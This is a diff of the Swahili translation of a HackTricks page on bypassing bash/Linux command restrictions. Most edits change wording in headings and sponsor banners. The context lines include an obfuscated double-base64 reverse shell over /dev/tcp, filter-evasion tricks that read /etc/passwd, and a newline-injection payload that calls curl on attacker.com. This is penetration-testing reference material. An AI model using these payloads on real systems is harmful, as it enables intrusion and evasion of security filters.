@@ -1,4 +1,4 @@
-# Kupita Kizuizi za Linux
+# Kupita Vizuizi vya Linux
 
 <details>
 
@@ -6,25 +6,25 @@
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutomatisha mchakato** zinazotumia zana za **jamii ya juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) kujenga na **kutomatisha mchakato** kwa kutumia zana za **jamii za juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Kizuizi cha Kawaida Kupita
+## Kupita Kizuizi cha Kawaida
 
-### Shell ya Nyuma
+### Kifaa cha Kugeuza (Reverse Shell)
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -93,7 +93,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Pita nafasi zilizozuiliwa
+### Pita nafasi zilizopigwa marufuku
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -126,7 +126,7 @@ g # These 4 lines will equal to ping
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Pita nyuma ya backslash na slash
+### Pita nyuma ya backslash na mshale
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -161,12 +161,12 @@ echo ${PATH:0:1} #/
 ```
 ### Uchimbaji wa data ya DNS
 
-Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kwa mfano.
+Unaweza kutumia **burpcollab** au [**pingb**](http://pingb.in) kama mfano.
 
 ### Vipengele vya Kujengwa
 
-Kwa hali ambapo huwezi kutekeleza kazi za nje na una ufikivu wa **seti ndogo ya vipengele vya kujengwa kupata RCE**, kuna mbinu muhimu za kufanya hivyo. Kawaida **hutaweza kutumia** vipengele **vyote vya kujengwa**, hivyo unapaswa **kujua chaguo zako zote** kujaribu kukiuka gereza. Wazo kutoka [**devploit**](https://twitter.com/devploit).\
-Kwanza kabisa angalia [**vipengele vya kujengwa vya terminali**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Kisha hapa una **mapendekezo kadhaa**:
+Kwa hali ambapo huwezi kutekeleza kazi za nje na una ufikivu wa **seti ndogo ya vipengele vya kujengwa kupata RCE**, kuna mbinu muhimu za kufanya hivyo. Kawaida **hutaweza kutumia vyote** vya **vipengele vya kujengwa**, hivyo unapaswa **kujua chaguo zako zote** kujaribu kukiuka gereza. Wazo kutoka kwa [**devploit**](https://twitter.com/devploit).\
+Kwanza kabisa angalia **vipengele vyote vya shel**i](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Kisha hapa una **mapendekezo kadhaa**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -228,8 +228,6 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-### Bashfuscator
-
 ### Bashfuscator
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
@@ -319,7 +317,7 @@ ln /f*
 ```
 ## Kizuizi cha Kusoma tu/Noexec/Distroless Kupita
 
-Ikiwa uko ndani ya mfumo wa faili na **ulinzi wa kusoma tu na noexec** au hata kwenye chombo cha distroless, bado kuna njia za **kutekeleza programu za binary za kupindukia, hata shelisheli!:**
+Ikiwa uko ndani ya mfumo wa faili wenye **ulinzi wa kusoma tu na noexec** au hata kwenye chombo cha distroless, bado kuna njia za **kutekeleza programu za binary za kiholela, hata shel!:**
 
 {% content-ref url="bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](bypass-fs-protections-read-only-no-exec-distroless/)
@@ -341,10 +339,10 @@ Ikiwa uko ndani ya mfumo wa faili na **ulinzi wa kusoma tu na noexec** au hata k
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii **za juu zaidi** duniani.\
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii zilizo **za juu zaidi** duniani.\
 Pata Ufikiaji Leo:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
 <details>
 
@@ -354,8 +352,8 @@ Njia nyingine za kusaidia HackTricks:
 
 * Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
 * Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
 * **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Shiriki mbinu zako za kuvamia kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
